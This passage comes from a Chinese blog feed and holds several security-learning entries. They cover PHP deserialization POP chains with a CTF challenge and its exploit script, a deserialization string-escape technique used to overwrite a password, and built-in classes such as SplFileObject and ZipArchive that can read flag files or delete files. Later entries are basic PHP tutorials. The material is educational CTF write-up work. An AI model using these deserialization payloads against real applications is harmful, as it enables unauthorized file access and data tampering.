file!&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class register&#123;</span><br><span class="line">    public function checking($username,$password)&#x2F;&#x2F;这边就会检查了</span><br><span class="line">    &#123;</span><br><span class="line">        if($username&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;$password&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;</span><br><span class="line">            die(&#39;success register admin&#39;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&#39;please register admin &#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Open&#123;</span><br><span class="line">    function open($filename, $content)&#123;</span><br><span class="line">        if(!file_get_contents(&#39;waf.txt&#39;))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo file_get_contents($filename.&quot;.php&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($_GET[&#39;a&#39;]!&#x3D;&#x3D;$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])&#x3D;&#x3D;&#x3D; sha1($_GET[&#39;b&#39;])))&#123;</span><br><span class="line">    @unserialize(base64_decode($_POST[&#39;unser&#39;]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>1.反序列化触发wake_up方法，wake_up方法中做了一个判断，我们输入的admin的时候将会跳转到login类当中<br>2.此时将会调用checking方法，这里有个参数 file，我们要对file赋值让让他进入Open类中调用file_get_contents函数</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Game&#123;</span><br><span class="line">    public  $username;</span><br><span class="line">    public  $password;</span><br><span class="line">    public  $choice;</span><br><span class="line">    public  $register;</span><br><span class="line"></span><br><span class="line">    public  $file;</span><br><span class="line">    public  $filename;</span><br><span class="line">    public  $content;</span><br><span class="line">&#125;</span><br><span class="line">class login&#123;</span><br><span class="line">&#125;</span><br><span class="line">class register&#123;</span><br><span class="line">&#125;</span><br><span class="line">class Open&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new Game;</span><br><span class="line">$b&#x3D;new Open;</span><br><span class="line">$a-&gt;register&#x3D;&quot;admin&quot;;</span><br><span class="line">$a-&gt;filename&#x3D;&quot;shell&quot;;</span><br><span class="line">$a-&gt;file&#x3D;$b;</span><br><span class="line">$a-&gt;username&#x3D;&quot;admin&quot;;</span><br><span class="line">$a-&gt;password&#x3D;&quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">print(base64_encode(serialize($s));</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>POP链的构造，其实一开始没仔细学习的时候我以为很简单，因为我想当然了，也是因为不了解各个魔术方法，所以以为是自己想去哪个函数就可以去哪个函数，但其实不是的，其中的逻辑性还是挺强的，可以先构造一个，然后再去慢慢调试。</p>
]]></content>
  </entry>
  <entry>
    <title>php反序列化字符串逃逸</title>
    <url>/2021/04/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><p>反序列化确实有很多内容需要去学，前段时间学习的反序列化确实不够用<a id="more"></a></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识:"></a>基础知识:</h2><p>1.php在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> test();</span><br><span class="line">$s=<span class="string">&#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;test&quot;;s:5:&quot;aaaaa&quot;;s:4:&quot;tess&quot;;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($s));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210413191022.png" alt="img" style="zoom:67%;">

<p>2.php在反序列化时，底层代码是以；作为字段的分割，以}作为结果（字符串除外），并且是根据长度判断内容的<br>3.对于类似这种O:1:”A”:2:{s:1:”a”;s:3:”123”;s:1:”b”;s:9:”xianyu123”;}s:1:”c”;s:2:”yes”;也是能够正常反序列化的，即使s:2:”yes”的长度不匹配也不影响。说明php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块。</p>
<h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>序列化的字符串在经过过滤函数不正确的处理而导致对象注入，因为先进行了序列化，再进行过滤，那么就有可能会产生此漏洞。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$f</span>)</span>&#123;</span><br><span class="line">    $filter = <span class="string">&#x27;/c/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;bb&#x27;</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$password = <span class="string">&quot;mypass&quot;</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先看看原本输出的内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string(39) &quot;a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;mypass&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0] &#x3D;&gt;</span><br><span class="line">  string(5) &quot;admin&quot;</span><br><span class="line">  [1] &#x3D;&gt;</span><br><span class="line">  string(6) &quot;mypass&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$username &#x3D; &quot;ggggyu123cccccccccccccccccccc\&quot;;i:1;s:6:\&quot;123456\&quot;;&#125;&quot;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string(84) &quot;a:2:&#123;i:0;s:49:&quot;ggggyu123cccccccccccccccccccc&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;mypass&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">D:\apache\www\反序列化字符串逃逸.php:12:</span><br><span class="line">string(104) &quot;a:2:&#123;i:0;s:49:&quot;ggggyu123bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;mypass&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">D:\apache\www\反序列化字符串逃逸.php:14:</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0] &#x3D;&gt;</span><br><span class="line">  string(49) &quot;ggggyu123bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span><br><span class="line">  [1] &#x3D;&gt;</span><br><span class="line">  string(6) &quot;123456&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时成功更改密码，刚刚理解了一下，其实原理很简单，先理解以下几点:<br>1.对应前一个序列化内容s:49这里说第一个变量的值有49个字符长度，那么接下来就会一直读取49个长度，如果少于或者大于都会报错导致读取不了<br>2.经过filter，我们发现一个c被替换成两个b了，但是依旧字符串长度为49个，但是我们原本在username里面的内容是变多了，这样我们后面输入的i:1;s:6:”123456”;}就<strong>逃逸出来了</strong><br>3.我们知道序列化是以读到}为终止的，所以此时密码就被修改为123456，因为后面的mypass那些已经被<strong>舍弃掉了</strong></p>
]]></content>
  </entry>
  <entry>
    <title>php反序列化问题</title>
    <url>/2021/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="pravite和Protected成员的序列化"><a href="#pravite和Protected成员的序列化" class="headerlink" title="pravite和Protected成员的序列化"></a>pravite和Protected成员的序列化</h2><h3 id="private类"><a href="#private类" class="headerlink" title="private类"></a>private类</h3><p>private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见</p>
<p><strong>private型在序列化的格式为:%00类名%00</strong><a id="more"></a></p>
<h3 id="protect"><a href="#protect" class="headerlink" title="protect"></a>protect</h3><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。<br>因此保护字段的字段名在序列化时，字段名前面会加上 \0*\0 的前缀，注意，这里的 \0 表示 ASCII 码为 0<br>的字符，也就是我们经过 urlencode 后看到的 %00 。</p>
<p>*<em>private型在序列化的格式为:%00</em>%00**</p>
<h3 id="var和public"><a href="#var和public" class="headerlink" title="var和public"></a>var和public</h3><p>var 和 public声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的 变量前缀符号 $。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例:"></a>实例:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> $age=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> $sex=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $a=<span class="keyword">new</span> test();</span><br><span class="line">    $a=serialize($a);</span><br><span class="line">    print_r($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;ghtwf01&quot;;s:9:&quot; test age&quot;;s:2:&quot;18&quot;;s:6:&quot; * sex&quot;;s:3:&quot;man&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>但是复制到URL中可能会丢失所以此时需要按如上说明进行标记</p>
<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><p>1.在php7.1+对类属性的检测不严格，所以可以用public来绕过</p>
<h2 id="php内置类整理"><a href="#php内置类整理" class="headerlink" title="php内置类整理"></a>php内置类整理</h2><p>近期遇到许多关于PHP内置类的题目，故在此整理一下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> $class . <span class="string">&#x27;::&#x27;</span> . $method . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>使用此代码 可以获取大部分的内置类:<br>这里就先说一下到目前为止遇到过的:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> ZipArchive();</span><br><span class="line">$a-&gt;filename=<span class="string">&quot;xxxx.xxx&quot;</span>;</span><br><span class="line">$a-&gt;content=ZipArchive::OVERWRITE;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>类</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td>DirectoryIterator</td>
<td align="center">遍历目录</td>
</tr>
<tr>
<td>FilesystemIterator</td>
<td align="center">遍历目录</td>
</tr>
<tr>
<td>GlobIterator</td>
<td align="center">遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
</tr>
<tr>
<td>SplFileObject</td>
<td align="center">读取文件，按行读取，多行需要遍历</td>
</tr>
<tr>
<td>finfo/finfo_open()</td>
<td align="center">需要两个参数</td>
</tr>
<tr>
<td>ZipArchive()</td>
<td align="center">任意文件删除</td>
</tr>
<tr>
<td></td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例:"></a>实例:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;new ZipArchive();</span><br><span class="line">$a-&gt;filename&#x3D;&quot;xxxx.xxx&quot;;</span><br><span class="line">$a-&gt;content&#x3D;ZipArchive::OVERWRITE;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$o  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$o  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>php运算符 字符串</title>
    <url>/2020/10/09/php%E8%BF%90%E7%AE%97%E7%AC%A6-%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="PHP类型比较"><a href="#PHP类型比较" class="headerlink" title="PHP类型比较"></a>PHP类型比较</h1><p>PHP变量的比较主要分为两种，就是<br><strong>松散比较</strong>：使用两个等号（==）比较，只比较值，不比较类型<br><strong>严格比较</strong>：用三个等号（===）比较，都比较</p>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">42</span> == <span class="string">&quot;42&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;1、值相等&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL; <span class="comment">// 换行符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">42</span> === <span class="string">&quot;42&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;2、类型相等&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;3、不相等&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出的结果分别是 值相等  值不相等</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="接下是PHP的常量"><a href="#接下是PHP的常量" class="headerlink" title="接下是PHP的常量"></a>接下是PHP的常量</h2><p>设置常量需要使用<strong>define（）函数</strong>         <a id="more"></a><br>使用方法如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">&quot;常量的名称&quot;</span>,<span class="string">&quot;常量的值&quot;</span>,(可定义为<span class="literal">true</span>也可不写));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;hwg&quot;</span>,<span class="string">&quot;wg是帅哥&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> hwg;<span class="comment">//输出是wg是帅哥</span></span><br><span class="line"><span class="keyword">echo</span> HWG;<span class="comment">//无法输出，因为大写未被定义</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>说明<br>1.第一个””是name:必选参数，常量名称，即标志符’<br>2.第二个””是value：必选参数，常量的值。<br>3最后一个交case_insensitive,可选参数，如果设置为TRUE，该常量则大小写不敏感，默认是大小写敏感的。</p>
<ol start="4">
<li>(常量名不需要加 $ 修饰符)。</li>
</ol>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;hwg&quot;</span>,<span class="string">&quot;wg是帅哥&quot;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> hwg;<span class="comment">//输出是wg是帅哥</span></span><br><span class="line"><span class="keyword">echo</span> HWG;<span class="comment">//输出wg是帅哥</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后一点是，<strong>常量是全局的</strong>，定义完该常量之后只要输出该常量，出来的定义以后的值。</p>
<h3 id="PHP字符串常量"><a href="#PHP字符串常量" class="headerlink" title="PHP字符串常量"></a>PHP字符串常量</h3><p>例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $txt;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="php并置运算符"><a href="#php并置运算符" class="headerlink" title="php并置运算符"></a>php并置运算符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt1=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">$txt2=<span class="string">&quot;What a nice day!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $txt1 . <span class="string">&quot; &quot;</span> . $txt2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出Hello world! What a nice day!</span></span><br></pre></td></tr></table></figure>

<p>PHP strlen()函数<br>用知道<strong>字符串的长度</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strlen(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h3><h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>
<p><strong>注释：</strong>strpos() 函数对大小写敏感。若没有找到，则返回strpos有两种类型的返回值，一种是整型，一种是bool型。</p>
<p><strong>注释：</strong>该函数是二进制安全的。<br>例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strops(<span class="string">&quot;you are hansom&quot;</span>,<span class="string">&quot;are&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果是4（计算方法如下：从第一个y为0开始算起，空格也算一个，所以到a之前一共有4个字节）</p>
<h3 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a>相关函数：</h3><ul>
<li><a href="https://www.w3school.com.cn/php/func_string_stripos.asp">stripos()</a> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</li>
<li><a href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li>
<li><a href="https://www.w3school.com.cn/php/func_string_strrpos.asp">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li>
</ul>
<p>参考链接<a href="https://www.w3school.com.cn/php/func_string_strpos.asp">https://www.w3school.com.cn/php/func_string_strpos.asp</a></p>
<h3 id="PHP运算符"><a href="#PHP运算符" class="headerlink" title="PHP运算符"></a>PHP运算符</h3><p>基本和C中的差不多，我就整理一下和C不一样的吧<br>第一个是<strong>intdiv（）</strong>函数：该函数返回值为第一个参数除于第二个参数的值并取等（向下取等）<br>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump(intdiv(<span class="number">10</span>, <span class="number">3</span>));</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出的值是int（3）<br>有一些运算符不太一样<br>比如<strong>不等于</strong>的表示方法有&lt;&gt;和!=<br><strong>绝对等于</strong>有===</p>
<h4 id="逻辑运算符："><a href="#逻辑运算符：" class="headerlink" title="逻辑运算符："></a>逻辑运算符：</h4><p>![X~KPJ$LXMK`4BK1HHQL4RP5](<a href="https://raw.githubusercontent.com/Hwwg/myphoto/master/X%7EKPJ%24LXMK%604BK1HHQL4RP5.png">https://raw.githubusercontent.com/Hwwg/myphoto/master/X%7EKPJ%24LXMK%604BK1HHQL4RP5.png</a>)</p>
<p>参考<a href="https://www.runoob.com/php/php-operators.html">https://www.runoob.com/php/php-operators.html</a></p>
<h3 id="PHP三元运算符"><a href="#PHP三元运算符" class="headerlink" title="PHP三元运算符"></a>PHP三元运算符</h3><p>这个和if else语句有点像，我先聊聊三元运算符<br><strong>三元运算符的格式(expr1) ? (expr2) : (expr3)</strong><br>解释：如果条件”expr1”成立，则执行语句”expr2”,否则执行”expr3”</p>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">echo</span> $b=<span class="number">19</span>?<span class="string">&quot;yes&quot;</span>:<span class="string">&quot;no&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果是no<br>转换成if语句就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>（$b==<span class="number">20</span>）&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;no&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>三元运算符的有点之处在于他很简练，还有更强大的应用，这里放个链接<br><a href="https://www.php.cn/php-weizijiaocheng-383293.html">https://www.php.cn/php-weizijiaocheng-383293.html</a><br>举个菜鸟教程的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = <span class="string">&#x27;菜鸟教程&#x27;</span>;</span><br><span class="line"><span class="comment">// 普通写法</span></span><br><span class="line">$username = <span class="keyword">isset</span>($test) ? $test : <span class="string">&#x27;nobody&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $username, PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP 5.3+ 版本写法</span></span><br><span class="line">$username = $test ?: <span class="string">&#x27;nobody&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $username, PHP_EOL;<span class="comment">//PHP_EOL的意思是一个换行符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个代码里面输出的都是菜鸟教程</p>
<p>今天先到这里吧。哈哈哈哈哈</p>
<h3 id="补充一下组合比较符"><a href="#补充一下组合比较符" class="headerlink" title="补充一下组合比较符"></a>补充一下组合比较符</h3><p>组合比较运算符：可以轻松实现两个变量的比较，当啊然不仅限于数值类数据的比较<br>符号是:&lt;=&gt;<br>语法格式如下：$c=$a&lt;=&gt;$b;<br>解析一下解析如下：</p>
<ul>
<li><p>如果 <strong>$a &gt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>1</strong>。</p>
</li>
<li><p>如果 <strong>$a == $b</strong>, 则 <strong>$c</strong> 的值为 <strong>0</strong>。</p>
</li>
<li><p>如果 <strong>$a &lt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>-1</strong>。<br>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 整型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &lt;=&gt; <span class="number">2</span>; <span class="comment">// -1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">2</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1.5</span> &lt;=&gt; <span class="number">1.5</span>; <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1.5</span> &lt;=&gt; <span class="number">2.5</span>; <span class="comment">// -1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">2.5</span> &lt;=&gt; <span class="number">1.5</span>; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span> &lt;=&gt; <span class="string">&quot;a&quot;</span>; <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span> &lt;=&gt; <span class="string">&quot;b&quot;</span>; <span class="comment">// -1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b&quot;</span> &lt;=&gt; <span class="string">&quot;a&quot;</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>postPHP efo&amp;数据类型</title>
    <url>/2020/10/08/postPHP-efo-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="EOF指令"><a href="#EOF指令" class="headerlink" title="EOF指令"></a>EOF指令</h1><p>echo &lt;&lt;&lt;EOF<br>//要输出的字符<br>EFO;</p>
<p>需要注意的点有<br>1.EOF其实可以用其他字母来表示<br>2.结尾必须要有分号<br>3 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。<br>接下来掩饰一段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=<span class="string">&quot;runoob&quot;</span>;</span><br><span class="line">$a= *&lt;&lt;&lt;EOF</span><br><span class="line">    <span class="string">&quot;abc&quot;</span>$name</span><br><span class="line">    <span class="string">&quot;123&quot;</span></span><br><span class="line">EOF*;</span><br><span class="line">*<span class="comment">// 结束需要独立一行且前后不能空格*</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果是</p>
<p>“abc”ronoob<br>    “123”</p>
